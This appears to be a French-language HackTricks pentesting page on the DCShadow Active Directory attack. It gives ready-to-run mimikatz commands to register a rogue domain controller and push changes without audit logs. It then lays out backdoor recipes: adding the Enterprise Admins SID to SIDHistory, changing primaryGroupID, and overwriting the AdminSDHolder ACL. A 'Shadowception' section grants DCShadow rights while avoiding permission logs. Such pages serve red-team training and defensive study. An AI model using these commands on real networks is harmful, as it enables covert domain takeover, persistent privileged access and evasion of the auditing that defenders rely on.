{{#include ../../banners/hacktricks-training.md}}

# DCShadow

Il enregistre un **nouveau contrôleur de domaine** dans l'AD et l'utilise pour **pousser des attributs** (SIDHistory, SPNs...) sur des objets spécifiés **sans** laisser de **logs** concernant les **modifications**. Vous **avez besoin de privilèges DA** et devez être dans le **domaine racine**.\
Notez que si vous utilisez des données incorrectes, des logs assez laids apparaîtront.

Pour effectuer l'attaque, vous avez besoin de 2 instances de mimikatz. L'une d'elles démarrera les serveurs RPC avec des privilèges SYSTEM (vous devez indiquer ici les changements que vous souhaitez effectuer), et l'autre instance sera utilisée pour pousser les valeurs :
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Remarquez que **`elevate::token`** ne fonctionnera pas dans la session `mimikatz1` car cela a élevé les privilèges du thread, mais nous devons élever le **privilège du processus**.\
Vous pouvez également sélectionner un objet "LDAP" : `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Vous pouvez pousser les changements depuis un DA ou depuis un utilisateur avec ces permissions minimales :

- Dans l'**objet de domaine** :
- _DS-Install-Replica_ (Ajouter/Retirer un Réplica dans le Domaine)
- _DS-Replication-Manage-Topology_ (Gérer la Topologie de Réplication)
- _DS-Replication-Synchronize_ (Synchronisation de Réplication)
- L'**objet Sites** (et ses enfants) dans le **conteneur de Configuration** :
- _CreateChild et DeleteChild_
- L'objet de l'**ordinateur qui est enregistré comme un DC** :
- _WriteProperty_ (Pas Write)
- L'**objet cible** :
- _WriteProperty_ (Pas Write)

Vous pouvez utiliser [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) pour donner ces privilèges à un utilisateur non privilégié (remarquez que cela laissera des logs). C'est beaucoup plus restrictif que d'avoir des privilèges DA.\
Par exemple : `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Cela signifie que le nom d'utilisateur _**student1**_ lorsqu'il est connecté sur la machine _**mcorp-student1**_ a des permissions DCShadow sur l'objet _**root1user**_.

## Utiliser DCShadow pour créer des portes dérobées
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Donner des permissions DCShadow en utilisant DCShadow (sans journaux de permissions modifiés)

Nous devons ajouter les ACE suivants avec le SID de notre utilisateur à la fin :

- Sur l'objet de domaine :
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Sur l'objet de l'ordinateur attaquant : `(A;;WP;;;UserSID)`
- Sur l'objet utilisateur cible : `(A;;WP;;;UserSID)`
- Sur l'objet Sites dans le conteneur Configuration : `(A;CI;CCDC;;;UserSID)`

Pour obtenir l'ACE actuel d'un objet : `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Remarquez que dans ce cas, vous devez faire **plusieurs changements,** pas juste un. Donc, dans la **session mimikatz1** (serveur RPC), utilisez le paramètre **`/stack` avec chaque changement** que vous souhaitez effectuer. De cette façon, vous n'aurez besoin de **`/push`** qu'une seule fois pour effectuer tous les changements empilés sur le serveur rogue.

[**Plus d'informations sur DCShadow dans ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
